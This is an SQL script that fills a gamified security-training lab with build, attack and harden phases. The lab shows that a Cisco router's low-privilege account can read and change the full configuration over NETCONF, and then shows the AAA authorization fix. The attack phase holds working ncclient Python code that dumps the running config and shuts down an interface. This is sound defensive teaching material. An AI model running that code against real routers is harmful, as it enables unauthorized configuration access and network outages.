-- ═══════════════════════════════════════════════════════════════════
-- Lab (id=44) — REST APIs & Data Formats : full content (Vol 2 · Ch 23-24)
-- ═══════════════════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Enable NETCONF the way a tutorial tells you to — then discover a low-privilege account can pull the full device config in structured XML, because nobody scoped AAA to cover it.'
WHERE id = 44;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Enable NETCONF the Easy Way',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 1 of 3</span>
<h3>Enable NETCONF the Easy Way</h3>
<p>NETCONF is the older, XML-and-SSH sibling of RESTCONF — same idea (structured, model-driven configuration instead of screen-scraping CLI output), different transport and data format. It rides over SSH on port 830, which means it's easy to assume "it's protected the same way SSH always is." That assumption is exactly what this lab tests.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 500 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: NETCONF over SSH · XML-based config data · YANG-modeled operations</span>
</div>

## Your arsenal

| Component | Role |
|---|---|
| R1 | Device with NETCONF enabled |
| KALI | NETCONF client, using a deliberately low-privilege account |

## Step 1 — Enable NETCONF on R1

```
enable
configure terminal
netconf-yang
end
```

## Step 2 — Create a low-privilege account for "read-only monitoring"

This is a completely normal, reasonable-sounding thing to do — give a monitoring script a limited account instead of full admin:

```
configure terminal
username monitor privilege 1 secret MonitorOnly2026!
end
```
`privilege 1` is the lowest EXEC level — enough to run basic `show` commands, nowhere near enough to change configuration through the CLI.

## Step 3 — Confirm the low-privilege account works fine over SSH

```
ssh monitor@<R1-IP>
show version
configure terminal    ! should be denied — privilege 1 can't enter config mode
```

<div class="callout tip">
<p>Exactly as intended — over the regular CLI, this account genuinely can't touch the configuration. Keep that fact in mind for Phase 2.</p>
</div>

<div class="achievement">
<span class="medal">🔧</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Least Privilege, CLI Edition — a limited account, correctly limited</span></span>
</div>

**Next:** Phase 2 — that same "correctly limited" account, through a different door.
$md$
WHERE lab_id = 44 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'The Same Account, a Different Door',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 2 of 3</span>
<h3>The Same Account, a Different Door</h3>
<p>Privilege levels restrict the CLI. NETCONF is a separate subsystem, and unless AAA authorization is explicitly extended to cover it, a low-privilege account that's correctly boxed in on the command line can walk straight through NETCONF's door and pull — or push — the full device configuration.</p>
</div>

<div class="callout danger">
<p><strong>Rules of engagement:</strong> run every command here against your own GNS3 lab only.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 750 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: NETCONF privilege-scope gap · get-config exploitation · YANG data exposure</span>
</div>

## Step 1 — Set up a NETCONF session as the "limited" monitoring account

```
pip install ncclient
python3
```
```python
from ncclient import manager

m = manager.connect(
    host="<R1-IP>", port=830,
    username="monitor", password="MonitorOnly2026!",
    hostkey_verify=False
)
```

## Step 2 — Pull the full configuration anyway

```python
config = m.get_config(source="running").data_xml
print(config)
```

<div class="callout tip">
<p><strong>💥 That's the moment.</strong> The full running-config comes back as structured XML — every interface, every ACL, every credential-adjacent line — from an account that <code>configure terminal</code> flatly refused ten minutes ago. NETCONF checked whether this user could authenticate over SSH at all, not whether their CLI privilege level should apply here too.</p>
</div>

## Step 3 — Prove it's not just read access

```python
xml_payload = """
<config>
  <native xmlns="http://cisco.com/ns/yang/Cisco-IOS-XE-native">
    <interface>
      <GigabitEthernet>
        <name>2</name>
        <shutdown/>
      </GigabitEthernet>
    </interface>
  </native>
</config>
"""
m.edit_config(target="running", config=xml_payload)
```

<div class="callout tip">
<p>A "read-only monitoring" account just shut down a live interface. The privilege boundary you built in Phase 1 was real — it just didn't extend to every door into the device.</p>
</div>

<div class="achievement">
<span class="medal">🚪</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Wrong Door, Same Key — the CLI boundary never made it to NETCONF</span></span>
</div>

**Next:** Phase 3 — make the boundary follow the account everywhere, not just on the CLI.
$md$
WHERE lab_id = 44 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Extend the Boundary Everywhere',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 3 of 3</span>
<h3>Extend the Boundary Everywhere</h3>
<p>The fix isn't disabling NETCONF — it's making sure AAA authorization actually governs it, the same way it governs the CLI, so a low-privilege account is low-privilege everywhere it can possibly connect.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 850 XP</span>
<span class="chip diff">◆ Difficulty: ★★★★☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: AAA authorization for NETCONF sessions · consistent privilege enforcement</span>
</div>

<ul class="objectives">
<li>Extend AAA authorization to cover NETCONF sessions explicitly</li>
<li>Confirm the monitoring account can still read basic state, but not edit config</li>
<li>Re-run the <code>edit_config</code> attack → rejected</li>
</ul>

## Fix 1 — Scope AAA authorization to NETCONF, not just VTY/CLI

```
configure terminal
aaa new-model
aaa authorization exec default local
aaa authorization config-commands
netconf-yang
 aaa authorization
end
```
This ties NETCONF operations back to the same privilege-level checks the CLI already enforced — a `privilege 1` account is now `privilege 1` no matter which subsystem it connects through.

## Fix 2 — Confirm the monitoring account still works for its actual job

```python
config = m.get_config(source="running").data_xml   # read access, still fine
```
Reading state for monitoring purposes should still succeed — the goal is scoping privilege correctly, not breaking the legitimate use case entirely.

## Re-run the attack (the fun part)

```python
m.edit_config(target="running", config=xml_payload)
```

<div class="callout tip">
<p>Rejected — an authorization error, not a silent success. The <code>monitor</code> account can look, exactly as intended, but can no longer touch configuration through any door, CLI or NETCONF alike. The privilege boundary you thought you'd already built in Phase 1 now actually means what it always should have.</p>
</div>

## Prove it to the grader

```
show running-config | include aaa authorization       ! covers config-commands and netconf-yang
! attempt edit_config as 'monitor' → authorization failure logged
show logging | include AAA                             ! denial logged
```

<div class="achievement">
<span class="medal">🛡️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">One Boundary, Every Door — privilege finally means the same thing everywhere</span></span>
</div>

<div class="mission">
<span class="tag">✔ LAB COMPLETE</span>
<h3>REST APIs &amp; Data Formats — cleared</h3>
<p>A "read-only" account, correctly boxed in on the CLI, walked straight through NETCONF and shut down a live interface — because privilege level was enforced in one place and assumed everywhere else. Extending AAA authorization to cover NETCONF explicitly closed that gap without taking away the account's real, legitimate access.</p>
<p><strong>Total: 2100 XP</strong> · Next target: <code>Ansible &amp; Terraform</code>, where the automation tool itself becomes the thing worth checking for drift.</p>
</div>
$md$
WHERE lab_id = 44 AND phase = 'harden';
